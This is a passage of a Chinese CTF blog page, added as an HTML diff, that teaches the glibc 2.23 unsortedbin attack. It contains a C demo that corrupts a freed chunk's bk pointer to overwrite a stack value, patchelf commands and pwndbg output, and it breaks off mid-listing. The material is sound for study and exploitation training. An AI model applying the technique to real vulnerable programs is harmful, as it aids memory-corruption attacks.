@@ -1,0 +1,580 @@
+  <!DOCTYPE html>
+  <html lang="zh-CN"  
+      data-theme-mode="auto"
+  >
+  <head>
+  <meta charset="utf-8">
+  
+  
+  
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_ex15nbittbh';window.REIMU_CONFIG.clipboard_tips = {"success":{"zh-CN":"复制成功 (*^▽^*)"},"fail":{"zh-CN":"复制失败 (ﾟ⊿ﾟ)ﾂ"},"copyright":{"enable":false,"count":50,"license_type":"by-nc-sa"}};window.REIMU_CONFIG.clipboard_tips.copyright.content = '本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！';window.REIMU_CONFIG.code_block = {"expand":true};window.REIMU_CONFIG.base = 'https://idcm-svg.github.io/HFTTC.github.io';window.REIMU_CONFIG.relative = '/HFTTC.github.io/';</script>
+  <title>
+    index | SEZUVEM=&#39;s Blog
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic|Noto Serif SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic|Noto Serif SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media='all'">
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_ex15nbittbh.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+    
+<link rel="stylesheet" href="/HFTTC.github.io/css/loader.css">
+
+    <meta name="description" content="Unsortedbin Attack 基本介绍参考资料：https:&#x2F;&#x2F;ctf-wiki.org&#x2F;pwn&#x2F;linux&#x2F;user-mode&#x2F;heap&#x2F;ptmalloc2&#x2F;unsorted-bin-attack&#x2F; UnSortedbin Attack 概述unsortedbin attack 顾名思义，该攻击和 Glibc 堆管理中的 Unsortedbin 的机制息息相关 。 unsortedbin">
+<meta property="og:type" content="article">
+<meta property="og:title" content="index">
+<meta property="og:url" content="https://idcm-svg.github.io/HFTTC.github.io/2026/04/28/PWN/PWNCTF/UnsortedbinAttack%E5%9F%BA%E6%9C%AC%E4%BB%8B%E7%BB%8D/index/index.html">
+<meta property="og:site_name" content="SEZUVEM&#x3D;&#39;s Blog">
+<meta property="og:description" content="Unsortedbin Attack 基本介绍参考资料：https:&#x2F;&#x2F;ctf-wiki.org&#x2F;pwn&#x2F;linux&#x2F;user-mode&#x2F;heap&#x2F;ptmalloc2&#x2F;unsorted-bin-attack&#x2F; UnSortedbin Attack 概述unsortedbin attack 顾名思义，该攻击和 Glibc 堆管理中的 Unsortedbin 的机制息息相关 。 unsortedbin">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/img/73098186_2PJk1qfRxSDyKr6a/1770394443751-fcb32473-0feb-4ee5-b934-a7a379a5bc22-104538.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/img/73098186_2PJk1qfRxSDyKr6a/1770394509370-d623ef98-0efa-45f7-855d-1a48ce206d04-356900.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/img/73098186_2PJk1qfRxSDyKr6a/1605518448778-38373f22-a306-4fe8-8c15-7a084e086147-454005.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/img/73098186_2PJk1qfRxSDyKr6a/1605518532583-ef6d2bd7-01e3-4c82-9cdd-21d6d20a1e1a-168825.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/img/73098186_2PJk1qfRxSDyKr6a/1605532168101-57e7d7b0-b051-4c2d-89b2-2fb8cdd2c2a5-009434.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/img/73098186_2PJk1qfRxSDyKr6a/1605532214849-ed5b7433-5172-407f-b9a0-ee4bb07306fa-966537.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/img/73098186_2PJk1qfRxSDyKr6a/1770396565331-c320a05e-4295-4a28-ae87-d99ba95e7037-476894.png">
+<meta property="article:published_time" content="2026-04-28T10:25:58.564Z">
+<meta property="article:modified_time" content="2026-04-28T11:19:30.418Z">
+<meta property="article:author" content="SEZUVEM&#x3D;">
+<meta property="article:tag" content="Pwn, CTF, Binary">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://idcm-svg.github.io/HFTTC.github.io/img/73098186_2PJk1qfRxSDyKr6a/1770394443751-fcb32473-0feb-4ee5-b934-a7a379a5bc22-104538.png">
+      <meta name="keywords" content="Pwn, CTF, Binary">
+    <link rel="alternate" href="/HFTTC.github.io/atom.xml" title="SEZUVEM='s Blog" type="application/atom+xml">
+    <link rel="shortcut icon" href="/HFTTC.github.io/images/favicon.ico">
+  
+<link rel="stylesheet" href="/HFTTC.github.io/css/style.css">
+
+  <link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" integrity="sha384-IfxC36XL/toUyJ939C73PcgMuRzAZuIzZxE38drsmO5p6jD7ei+Zx/1oA/0l8ysE" crossorigin="anonymous">
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.2/dist/aos.css" integrity="sha384-GMRP93c6Hkz9JVKGAuRR3nTS7M07RwPgTFenXiosjq2VbVgvdDNcz1g6Mkj8AONa" crossorigin="anonymous">
+
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+  <body>
+      <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi rotate">
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+      </div>
+      <div class="loading-word">少女祈祷中...</div>
+    </div>
+  </div>
+  <script>
+    var time = null;
+    var loaderEl = document.getElementById('loader');
+    var startLoading = () => {
+      time = Date.now();
+      loaderEl.classList.remove("loading");
+    }
+    var hideLoader = () => {
+      document.body.style.overflow = 'auto';
+      loader.classList.add('loading');
+    };
+
+    var endLoading = () => {
+      if (!time) {
+        hideLoader();
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          hideLoader();
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    loaderEl.addEventListener('click', endLoading);
+  </script>
+<div id="copy-tooltip"></div>
+<div id="heatmap-tooltip"></div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav" aria-label="Primary navigation">
+        <a class="main-nav-link-wrap" href="/HFTTC.github.io/">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">首页</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/HFTTC.github.io/archives">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">归档</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/HFTTC.github.io/about">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">关于</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/HFTTC.github.io/friend">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">友链</span>
+        </a>
+    <a id="main-nav-toggle" class="nav-icon" aria-label="Toggle navigation" role="button"></a>
+  </nav>
+  <nav id="sub-nav" aria-label="Secondary navigation">
+      <a id="nav-rss-link" class="nav-icon" href="/HFTTC.github.io/atom.xml" title="RSS 订阅" aria-label="RSS 订阅" target="_blank"></a>
+  </nav>
+</div>
+<header id="header" aria-label="Site header">
+        <picture>
+        </picture>
+          <img  fetchpriority="high" src="/HFTTC.github.io/images/banner.webp" alt="index">
+  <div id="header-outer">
+    <div id="header-title">
+          <span id="logo">
+            <h1 data-aos="slide-up">index</h1>
+          </span>
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+        </h2>
+    </div>
+  </div>
+</header>
+
+        <div id="content" aria-label="Page content"  class="sidebar-right" >
+          <aside id="sidebar" aria-label="Sidebar">
+  <div class="sidebar-wrapper-container sticky">
+  <div class="sidebar-wrapper">
+    <div class="sidebar-wrap" data-aos="fade-up">
+          <div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
+<div class="sidebar-toc-wrapper toc-div-class" >
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Unsortedbin-Attack-%E5%9F%BA%E6%9C%AC%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.</span> <span class="toc-text">Unsortedbin Attack 基本介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#UnSortedbin-Attack-%E6%A6%82%E8%BF%B0"><span class="toc-number">1.1.</span> <span class="toc-text">UnSortedbin Attack 概述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#UnSortedbin-Attack-%E5%9B%9E%E9%A1%BE"><span class="toc-number">1.2.</span> <span class="toc-text">UnSortedbin Attack 回顾</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#global-max-fast-%E6%98%AF-main-arena-%E4%B8%AD%E6%8E%A7%E5%88%B6%E6%9C%80%E5%A4%A7-fastbin-%E5%A4%A7%E5%B0%8F%E7%9A%84%E5%8F%98%E9%87%8F"><span class="toc-number">2.</span> <span class="toc-text">global_max_fast 是 main_arena 中控制最大 fastbin 大小的变量</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#unsortedbin-%E7%9A%84%E7%BB%93%E6%9E%84"><span class="toc-number">2.1.</span> <span class="toc-text">unsortedbin 的结构</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#UnSortedbin-%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%9D%A5%E6%BA%90"><span class="toc-number">2.2.</span> <span class="toc-text">UnSortedbin 的基本来源</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#unsortedbin-%E7%9A%84%E4%BD%BF%E7%94%A8"><span class="toc-number">2.3.</span> <span class="toc-text">unsortedbin 的使用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#UnsortedBin-Attack-%E5%8E%9F%E7%90%86"><span class="toc-number">2.4.</span> <span class="toc-text">UnsortedBin Attack 原理</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#stack-var-p-%E7%9A%84%E5%88%9D%E5%A7%8B%E5%80%BC"><span class="toc-number">2.4.1.</span> <span class="toc-text">stack_var&amp;p 的初始值</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#unsigned-long-p-malloc-0x410"><span class="toc-number">2.4.2.</span> <span class="toc-text">unsigned long *p&#x3D;malloc(0x410);</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#malloc-500"><span class="toc-number">2.4.3.</span> <span class="toc-text">malloc(500);</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%BB%A7%E7%BB%AD-n-%E6%89%A7%E8%A1%8C-free-p"><span class="toc-number">2.4.4.</span> <span class="toc-text">继续 n 执行 free(p);</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%89%A7%E8%A1%8Cp-1-unsigned-long-stack-var-2"><span class="toc-number">2.4.5.</span> <span class="toc-text">执行p[1]&#x3D;(unsigned long)(&amp;stack_var-2);</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%89%A7%E8%A1%8Cmalloc-0x410"><span class="toc-number">2.4.6.</span> <span class="toc-text">执行malloc(0x410);</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">2.5.</span> <span class="toc-text">总结</span></a></li></ol></li></ol>
+</div>
+</div>
+          <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/HFTTC.github.io/avatar/head.jpg" data-sizes="auto" alt="SEZUVEM=" class="lazyload">
+  <div class="sidebar-author-name">SEZUVEM=</div>
+  <div class="sidebar-description">心之所向，无问西东</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">198</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+</div>
+<div class="sidebar-social" >
+</div>
+<div class="sidebar-menu">
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/" aria-label="首页"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/archives" aria-label="归档"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/about" aria-label="关于"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/friend" aria-label="友链"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+</div>
+</div>
+          <div class="sidebar-btn-wrapper" style="position:static">
+            <div class="sidebar-toc-btn current"></div>
+            <div class="sidebar-common-btn"></div>
+          </div>
+    </div>
+  </div>
+  <div class="sidebar-widget">
+  </div>
+  </div>
+</aside>
+
+          <section id="main" aria-label="Main content"><article id="post-PWN/PWNCTF/UnsortedbinAttack基本介绍/index" class="h-entry article" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <span class="article-date-link icon-calendar" data-aos="zoom-in">
+    <time datetime="2026-04-28T10:25:58.564Z" itemprop="datePublished">2026-04-28</time>
+    <time style="display: none;" id="post-update-time">2026-04-28</time>
+  </span>
+</div>
+
+    </div>
+    
+    <div class="hr-line"></div>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+        <h1 id="Unsortedbin-Attack-基本介绍"><a href="#Unsortedbin-Attack-基本介绍" class="headerlink" title="Unsortedbin Attack 基本介绍"></a>Unsortedbin Attack 基本介绍</h1><p>参考资料：<a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/unsorted-bin-attack/">https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/unsorted-bin-attack/</a></p>
+<h3 id="UnSortedbin-Attack-概述"><a href="#UnSortedbin-Attack-概述" class="headerlink" title="UnSortedbin Attack 概述"></a>UnSortedbin Attack 概述</h3><p>unsortedbin attack 顾名思义，该攻击和 Glibc 堆管理中的 Unsortedbin 的机制息息相关 。</p>
+<p>unsortedbin attack 被利用的前提是控制 UnSorted Bin Chunk 的 bk 指针</p>
+<p>unsortedbin attack 可以达到的效果是实现修改任意地址值为一个较大的数值。</p>
+<h3 id="UnSortedbin-Attack-回顾"><a href="#UnSortedbin-Attack-回顾" class="headerlink" title="UnSortedbin Attack 回顾"></a>UnSortedbin Attack 回顾</h3><p>unsortedbin attack 作为一种久远的攻击方式，尝尝作为其他攻击方式的辅助手段，比如修改 global_max_fast 为一个较大的值，使得几乎所有大小的 chunk 都用 fastbin 的管理方式进行分配和释放，又或者修改 _IO_list_all 来伪造 _IO_FILE 进行攻击。在上述攻击的利用过程中我们实际上并不需要对unsortedbin的分配过程有太多了解</p>
+<h1 id="global-max-fast-是-main-arena-中控制最大-fastbin-大小的变量"><a href="#global-max-fast-是-main-arena-中控制最大-fastbin-大小的变量" class="headerlink" title="global_max_fast 是 main_arena 中控制最大 fastbin 大小的变量"></a>global_max_fast 是 main_arena 中控制最大 fastbin 大小的变量</h1><h4 id="unsortedbin-的结构"><a href="#unsortedbin-的结构" class="headerlink" title="unsortedbin 的结构"></a>unsortedbin 的结构</h4><p>unsortedbin 在管理时为循环双向链表，<font style="color:rgba(0, 0, 0, 0.87);">若 </font><font style="color:rgb(54, 70, 78);background-color:rgb(245, 245, 245);">Unsorted Bin</font><font style="color:rgba(0, 0, 0, 0.87);"> 中有两个 </font><font style="color:rgb(54, 70, 78);background-color:rgb(245, 245, 245);">bin</font><font style="color:rgba(0, 0, 0, 0.87);">，那么该链表结构如下</font></p>
+<p><img src="/HFTTC.github.io/./img/73098186_2PJk1qfRxSDyKr6a/1770394443751-fcb32473-0feb-4ee5-b934-a7a379a5bc22-104538.png" alt="1770394443751-fcb32473-0feb-4ee5-b934-a7a379a5bc22.png"></p>
+<p><font style="color:rgba(0, 0, 0, 0.87);">在该链表中必有一个节点（不准确的说，是尾节点，这个就意会一下把，毕竟循环链表实际上没有头尾）的 </font><code><font style="color:rgb(54, 70, 78);background-color:rgb(245, 245, 245);">fd</font></code><font style="color:rgba(0, 0, 0, 0.87);"> 指针会指向 </font><code><font style="color:rgb(54, 70, 78);background-color:rgb(245, 245, 245);">main_arena</font></code><font style="color:rgba(0, 0, 0, 0.87);"> 结构体内部。</font></p>
+<p><img src="/HFTTC.github.io/./img/73098186_2PJk1qfRxSDyKr6a/1770394509370-d623ef98-0efa-45f7-855d-1a48ce206d04-356900.png" alt="1770394509370-d623ef98-0efa-45f7-855d-1a48ce206d04.png"></p>
+<p>倘若只有一个 bin，那么该链表的 fd 和 bk 指针都指向它本身。</p>
+<h4 id="UnSortedbin-的基本来源"><a href="#UnSortedbin-的基本来源" class="headerlink" title="UnSortedbin 的基本来源"></a>UnSortedbin 的基本来源</h4><ol>
+<li>当一个较大的 chunk 被<font style="color:rgba(0, 0, 0, 0.87);">分割成两半后，如果剩下的部分大于 MINSIZE，就会被放到 unsorted bin 中。</font></li>
+<li><font style="color:rgba(0, 0, 0, 0.87);">释放一个不属于 fast bin 的 chunk，并且该 chunk 不和 top chunk 紧邻时，该 chunk 会被首先放到 unsorted bin 中。关于 top chunk 的解释，请参考下面的介绍。</font></li>
+<li><font style="color:rgba(0, 0, 0, 0.87);">当进行 malloc_consolidate 时，可能会把合并后的 chunk 放到 unsorted bin 中，如果不是和 top chunk 近邻的话。malloc_consolidate（对堆中的碎片进行整理，减少堆中的碎片）。</font></li>
+</ol>
+<h4 id="unsortedbin-的使用"><a href="#unsortedbin-的使用" class="headerlink" title="unsortedbin 的使用"></a>unsortedbin 的使用</h4><ol>
+<li>在 unsortedbin 的使用过程中，采用的遍历顺序是 FIFO(First In Frist out)先进先出，即插入的时候插入到 unsortedbin 的头部，取出的时候从链尾获取，因此 unsortedbin 遍历堆块的时候使用的是 bk 指针。</li>
+<li>在程序进行 malloc 时，如果在 fastbin，smallbin 中找不到对应大小的 chunk，就会尝试从 unsortedbin 中寻找 chunk。如果取出的 chunk 大小正好满足，就会直接返还给用户，否则就会把这些 chunk 分别插入到相应的 bin 中。</li>
+</ol>
+<h3 id="UnsortedBin-Attack-原理"><a href="#UnsortedBin-Attack-原理" class="headerlink" title="UnsortedBin Attack 原理"></a>UnsortedBin Attack 原理</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#glibc-2.23/malloc/malloc.c</span></span><br><span class="line">#源码第<span class="number">3515</span><span class="number">-3517</span>行</span><br><span class="line">		  <span class="comment">/* remove from unsorted list */</span></span><br><span class="line">          unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">          bck-&gt;fd = unsorted_chunks (av);</span><br><span class="line"><span class="comment">//unsorted_chunks(av)其实是&amp;main_arena.top</span></span><br></pre></td></tr></table></figure>
+
+<p>可以看一下 glibc 的源码，当将一个 unsortedbin 取出时，会将 bck-&gt;fd 的位置写入 UnSortedbin 的位置，换而言之：如果我们控制了 bk 的值，就可以将 unsorted_chunk(av)写到任意地址。</p>
+<p>以下通过一个实例来掩饰 unsortedbin_attack 的原理，<font style="color:#DF2A3F;">目标是通过攻击将 stack_var 改成一个很大的值</font>。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;unsorted bin attack 实现了把一个超级大的数（unsorted bin 的地址）写到一个地方\n&quot;</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;实际上这种攻击方法常常用来修改 global_max_fast 来为进一步的 fastbin attack 做准备\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> stack_var=<span class="number">0</span>;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;我们准备把这个地方 %p 的值 %ld 更改为一个很大的数\n\n&quot;</span>, &amp;stack_var, stack_var);</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *p=<span class="built_in">malloc</span>(<span class="number">0x410</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;一开始先申请一个比较正常的 chunk: %p\n&quot;</span>,p);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;再分配一个避免与 top chunk 合并\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">500</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(p);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;当我们释放掉第一个 chunk 之后他会被放到 unsorted bin 中，同时它的 bk 指针为 %p\n&quot;</span>,(<span class="type">void</span>*)p[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    p[<span class="number">1</span>]=(<span class="type">unsigned</span> <span class="type">long</span>)(&amp;stack_var<span class="number">-2</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;现在假设有个漏洞，可以让我们修改 free 了的 chunk 的 bk 指针\n&quot;</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;我们把目标地址（想要改为超大值的那个地方）减去 0x10 写到 bk 指针:%p\n\n&quot;</span>,(<span class="type">void</span>*)p[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x410</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;再去 malloc 的时候可以发现那里的值已经改变为 unsorted bin 的地址\n&quot;</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;%p: %p\n&quot;</span>, &amp;stack_var, (<span class="type">void</span>*)stack_var);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>执行之前，先给程序换一个低版本的 libc</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">patchelf --<span class="built_in">set</span>-interpreter ./glibc-<span class="built_in">all</span>-<span class="keyword">in</span>-one/libs/<span class="number">2.23</span>-0ubuntu3_amd64/ld-<span class="number">2.23</span>.so ./test1</span><br><span class="line">patchelf --<span class="built_in">set</span>-rpath /home/kali/Desktop/glibc-<span class="built_in">all</span>-<span class="keyword">in</span>-one/libs/<span class="number">2.23</span>-0ubuntu3_amd64 ./test1 </span><br></pre></td></tr></table></figure>
+
+<p>下面开始对程序进行调试：我们直到stack_var 初始值为 0，运行到这里看一下：</p>
+<h5 id="stack-var-p-的初始值"><a href="#stack-var-p-的初始值" class="headerlink" title="stack_var&amp;p 的初始值"></a>stack_var&amp;p 的初始值</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">──────────────────────────────────────────────────────────────────────────[ DISASM / x86<span class="number">-64</span> / <span class="built_in">set</span> emulate on ]───────────────────────────────────────────────────────────────────────────</span><br><span class="line"> ► <span class="number">0x400722</span> &lt;main+<span class="number">124</span>&gt;    mov    edi, <span class="number">0x410</span>     EDI =&gt; <span class="number">0x410</span></span><br><span class="line">   <span class="number">0x400727</span> &lt;main+<span class="number">129</span>&gt;    call   <span class="built_in">malloc</span>@plt                  &lt;<span class="built_in">malloc</span>@plt&gt;</span><br><span class="line"> </span><br><span class="line">   <span class="number">0x40072c</span> &lt;main+<span class="number">134</span>&gt;    mov    qword ptr [rbp - <span class="number">0x10</span>], rax</span><br><span class="line">   <span class="number">0x400730</span> &lt;main+<span class="number">138</span>&gt;    mov    rax, qword ptr [rip + <span class="number">0x200929</span>]     RAX, [<span class="built_in">stderr</span>@@GLIBC_2.<span class="number">2.5</span>]</span><br><span class="line">   <span class="number">0x400737</span> &lt;main+<span class="number">145</span>&gt;    mov    rdx, qword ptr [rbp - <span class="number">0x10</span>]</span><br><span class="line">   <span class="number">0x40073b</span> &lt;main+<span class="number">149</span>&gt;    mov    esi, <span class="number">0x400a18</span>                       ESI =&gt; <span class="number">0x400a18</span> ◂— in al, <span class="number">0xb8</span></span><br><span class="line">   <span class="number">0x400740</span> &lt;main+<span class="number">154</span>&gt;    mov    rdi, rax</span><br><span class="line">   <span class="number">0x400743</span> &lt;main+<span class="number">157</span>&gt;    mov    eax, <span class="number">0</span>                              EAX =&gt; <span class="number">0</span></span><br><span class="line">   <span class="number">0x400748</span> &lt;main+<span class="number">162</span>&gt;    call   <span class="built_in">fprintf</span>@plt                 &lt;<span class="built_in">fprintf</span>@plt&gt;</span><br><span class="line"> </span><br><span class="line">   <span class="number">0x40074d</span> &lt;main+<span class="number">167</span>&gt;    mov    rax, qword ptr [rip + <span class="number">0x20090c</span>]     RAX, [<span class="built_in">stderr</span>@@GLIBC_2.<span class="number">2.5</span>]</span><br><span class="line">   <span class="number">0x400754</span> &lt;main+<span class="number">174</span>&gt;    mov    rcx, rax</span><br><span class="line">─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; info local</span><br><span class="line">stack_var = <span class="number">0</span></span><br><span class="line">p = <span class="number">0x7fffffffddd0</span></span><br><span class="line">pwndbg&gt; x/<span class="number">10</span>gx &amp;p</span><br><span class="line"><span class="number">0x7fffffffdce0</span>: <span class="number">0x00007fffffffddd0</span>      <span class="number">0xc9bcfe6894c28c00</span></span><br><span class="line"><span class="number">0x7fffffffdcf0</span>: <span class="number">0x0000000000400870</span>      <span class="number">0x00007ffff7820830</span></span><br><span class="line"><span class="number">0x7fffffffdd00</span>: <span class="number">0x0000000000000000</span>      <span 